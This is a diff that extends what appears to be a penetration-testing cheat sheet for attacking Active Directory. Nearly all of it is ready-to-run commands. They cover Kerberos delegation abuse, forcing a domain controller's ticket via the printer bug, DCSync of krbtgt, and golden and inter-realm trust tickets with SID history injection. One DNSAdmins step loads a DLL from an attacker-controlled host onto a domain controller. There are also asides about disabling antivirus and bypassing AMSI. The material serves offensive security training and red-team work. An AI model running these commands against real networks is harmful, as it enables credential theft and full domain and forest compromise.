@@ -295,6 +295,8 @@ You can look to see where else your current user has local admin access. This is
 `Invoke-UserHunter -CheckAccess`
  - Find users on high value targets (e.g. Domain Controllers, File Servers) (less noisy)
 `Invoke-UserHunter -Stealth`
+ - Setup a rolling check for a user logon
+`Invoke-UserHunter -ComputerName <targetserver> -Poll 100 -UserName <targetuser> -Delay 5`
 
  - Find local admins on all machines in the domain (needs admin privileges)
 `Invoke-EnumerateLocalAdmin`
@@ -592,3 +594,131 @@ Get-RemoteMachineAccountHash
 `Get-ASREPHash -UserName <username>`
  - Brute Force the hash
 `john <hashfile.txt> --wordlist=wordlist.txt`
+
+### Unconstrained Delegation
+#### PowerView
+ - Find machines that have unconstrained delegation enabled (NB DCs will always show unconstrained delegation as enabled)
+`Get-NetComputer -Unconstrained`
+
+#### AD Module
+ - Find machines that have unconstrained delegation enabled (NB DCs will always show unconstrained delegation as enabled)
+`Get-ADComputer -Filter {TrustedForDelegation -eq $True}`
+`Get-ADUser -Filter {TrustedForDelegation -eq $True}`
+
+Presuming that we've already have the hash of a user that is an admin on the server that has unconstrained delegation enabled.
+ - Over Pass the hash to the server
+`Invoke-Mimikatz -Command '"sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<userhash> /run:powershell.exe"'`
+ - Setup a PSSession to the target server and load Mimikatz
+```
+$sess = New-PSSession -ComputerName <targetserver>
+Enter-PSSession -Session $sess
+# BYPASS AMSI
+exit
+Invoke-Command -FilePath c:\tools\Invoke-Mimikatz.ps1 -Session $sess
+Enter-PSSession -Session $sess
+```
+ - Extract the tickets and hope for DA (this can be influenced with the printer bug)
+`Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'`
+ - If there's a ticket you want to re-use play Pass the ticket with Mimikatz
+`Invoke-Mimikatz -Command '"kerberos::ptt c:\path\to\ticket.kirbi"'`
+
+### Printer Bug
+ - Copy Rubeus to the compromised server (You will likely need to disable AV)
+`Copy-Item -ToSession $sess -Path <source> -Destination <destination>`
+- On the compromised server capture the TGT of the connecting server using Rubeus (https://github.com/GhostPack/Rubeus) 
+`.\Rubeus.exe monitor /interval:5 /nowrap`
+ - Force the connection of the DC to the compromised server using MS-RPRN.exe (https://github.com/leechristensen/SpoolSample)
+`.\MS-RPRN.exe \\<targetDC> \\<compromisedserver>`
+ - Copy the Base64 encoded ticket of the targetDC, remove spaces and newlines and save the ticket
+ - Pass the ticket using Rubeus on the attacker machine
+`.\Rubeus.exe ptt /ticket:<TGTofDC>`
+ - Once you have access as the DC machine account, run a DCSync to extract any or all users (get KRBTGT and you have Golden Ticket)
+`Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain\useraccounttoretrieve>"'`
+
+### Constrained Delegation
+ - Enumerate users and computers with constrained delegation enabled
+	 - using PowerView (dev)
+`Get-DomainUser -TrustedToAuth`
+`Get-DomainComputer -TrustedToAuth`
+	 - using AD module
+`Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo`
+ - Presuming we already have either the plaintext or hash of the password for the user with delegation enabled
+	 - use Kekeo to request a TGT for the service
+`.\kekeo.exe`
+`tgt::ask /user:<userthatcandelegate> /domain:<domain> /rc4:<userhash>`
+	- Now request a TGS for the service using a Domain Admin account
+`s4u /tgt:<tgt.kirbi> /user:<targetuser>@<targetdomain> /service:<targetSPN>`
+	 - We should now have a TGS as the Domain Admin. Use Mimikatz to pass the ticket
+`Invoke-Mimikatz -Command '"kerberos::ptt <tgsticket.kirbi>"'`
+	 - This gives us DA access to the target service (e.g. CIFS)
+`ls \\<targetserver>\c$`
+ - Use Rubeus for the same thing
+`.\Rubeus.exe s4u /user:<userthatcandelegate> /rc4:<ntlmhash> /impersonateuser:<targetuser> /msdsspn:"<targetSPN>" /ptt`
+ - For delegated machine accounts request an alternate service (e.g. ldap/host/rpcss/http) that is running as the same service account that the delegated SPN is
+	 - With Kekeo
+`tgt::ask /user:<machinethatcandelegate> /domain:<domain> /rc4:<userhash>`
+`tgs::s4u /tgt:<tgt.kirbi> /user:<targetuser>@<targetdomain> /service:<delegatedSPN|ldap/targetcomputername>`
+`Invoke-Mimikatz -Command '"kerberos::ptt <tgsticket.kirbi>"'`
+	 - With Rubeus
+`.\Rubeus.exe s4u /user:<machinethatcandelegate> /rc4:<ntlmhash> /impersonateuser:<targetuser> /msdsspn:"<targetSPN>" /altservice:ldap /ptt`
+	 - Now we have access as the dcmachine account
+`Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'`
+
+### DNS Admins
+ - Enumerate members of the DNSAdmins Group
+	 - With Powerview
+`Get-NetGroupMember -GroupName "DNSAdmins"`
+	 - With AD Module
+`Get-ADGroupMember -Identity DNSAdmins`
+ - As the user that is in the DNSAdmins group
+	 - Using dnscmd.exe (requires RSAT DNS)
+`dnscmd <target-dc> /config /serverlevelplugindll \\attackerIP\mimilib.dll`
+	 - Using DNSServer module (needs RSAT DNS)
+```
+$dnsettings = Get-DNSServerSetting -ComputerName <target-dc> -All
+$dnsettings.ServerLevelPluginDLL = "\\<attackerIP>\mimilib.dll"
+Set-DNSServerSetting -InputObject $dnsettings -ComputerName <target-dc>
+```
+ - Restart the DNS Service
+```
+sc \\<target-dc> stop DNS
+sc \\<target-dc> start DNS
+```
+
+### Trust Tickets
+#### Domain Trusts
+##### Trust Keys
+You can find the RC4 Trust Key for a domain using any of the following commands *It is the in key you generally want e.g. [in] source domain -> target domain
+ - `Invoke-Mimikatz -Command '"lsadump::trust /patch"' -computername <domaincontroller>`
+ - `Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain\username>"'`
+ - `Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`
+
+Create the Inter-Realm TGT and inject Administrator account into the SID History
+ - `Invoke-Mimikatz -Command '"kerberos::golden /user:<usertoimpersonate> /domain:<currentdomain> /sid:<currentdomainSID> /sids:<SIDofenterpriseadmingroupontarget> /rc4:<trustkeyhash> /service:krbtgt /target:<targetdomainFQDN> /ticket:<path/to/tickettosave.kirbi>"'`
+Use the ticket to create a TGS for CIFS on the parent domain
+ - Using Kekeo
+	 - Request the TGS
+	 - `.\asktgs.exe C:\AD\trust_tkt.kirbi CIFS/<parentdomaindc>`
+	 - Present the TGS to the target service
+	 - `.\kirbikator.exe lsa .\<savedticket.kirbi>`
+	 - `ls \\<parentdomain-dc>\c$`
+ - Using Rubeus
+	 - Request and use the TGS using the trust key ticket created earlier
+	 - `.\Rubeus.exe asktgs /ticket:C:\AD\trust_tkt.kirbi /service:CIFS/<parentdomaindc> /dc:<parentdomain-dc> /ptt`
+##### krbtgt
+You can also inject the SIDHistory of Enterprise Admins group as part of a golden ticket attack
+`Invoke-Mimikatz -Command '"kerberos::golden /user:<usertoimpersonate> /domain:<currentdomain> /sid:<currentdomainSID> /sids:<SIDofenterpriseadmingroupontarget> /krbtgt:<currentdomainkrbtgthash> /ptt"'`
+Now run commands as enterprise admin on the parent domain:
+`gwmi -class win32_operatingsystem -computername <parentdc>`
+
+You can also avoid detection by impersonating the Domain Controller and the Domain Controllers group
+(SID 516 is domain controllers group, S-1-5-9 is Enterprise Domain Controllers SID)
+`Invoke-Mimikatz -Command '"kerberos:golden /user:<currentdomaindc$> /domain:<currentdomain> /sid:<currentdomainsid> /groups:516 /sids:<currentdomaindomaincontrollersgroupSID>,S-1-5-9 /krbtgt:<currentdomainkrbtgthash> /ptt"'`
+Profit:
+`Invoke-Mimikatz -Command '"lsadump::dcsync /user:<parentdomain>/Administrator /domain:<parentdomain>"'`
+
+#### Forest Trusts
+SID History won't work over a forest trust due to SID filtering.
+Use Rubeus to inject a Trust ticket with Mimikatz as above, into a TGS request across a Forest trust and access a CIFS shared service
+`.\Rubeus.exe asktgs /ticket:<path\to\trust_ticket.kirbi> /service:cifs/<otherdomaindc.domain.com> /dc:<otherdomaindc> /ptt`
+`ls \\otherdomaindc.domain.com\share`
